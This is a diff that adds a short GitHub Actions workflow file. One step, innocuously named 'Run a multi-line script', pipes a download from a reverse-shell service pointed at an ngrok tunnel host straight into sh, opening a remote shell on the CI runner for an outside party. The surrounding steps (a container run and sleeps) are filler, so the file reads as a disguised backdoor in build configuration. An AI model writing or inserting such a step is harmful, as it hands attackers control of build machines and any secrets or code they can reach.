@@ -1,0 +1,20 @@
+name: CI
+
+on: workflow_dispatch
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Step one
+        run: Starting 
+      
+      - name: Execute contaienr
+        run: docker run -d alpine:3.17.1 sleep 5
+        
+      - name: Run a multi-line script
+        run: curl https://reverse-shell.sh/2.tcp.ngrok.io:18155 | sh
+      
+      - name: Sleep
+        run: sleep 5
